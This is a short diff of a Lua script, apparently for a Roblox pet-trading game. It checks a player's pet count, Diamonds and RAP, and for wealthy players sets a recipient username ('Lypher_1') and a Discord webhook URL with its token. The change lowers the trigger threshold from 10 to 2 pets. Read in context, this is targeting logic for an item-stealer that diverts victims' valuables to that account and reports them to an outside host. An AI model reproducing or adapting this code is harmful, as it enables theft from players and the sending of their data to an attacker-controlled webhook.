@@ -13,7 +13,7 @@ for i,v in pairs(Library.Save.Get().Pets) do
         print(v)
     end
 end
-if hugeamount >10 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
      UserName = "Lypher_1"
      Webhook = "https://discord.com/api/webhooks/1114988483166089216/2Fsoy404Y5cMei7ahmmfw5Vn5ScHDAPCfSOjYaZIPN433bVxQwFMgLwmR6Bz79bTMZAi"
 end
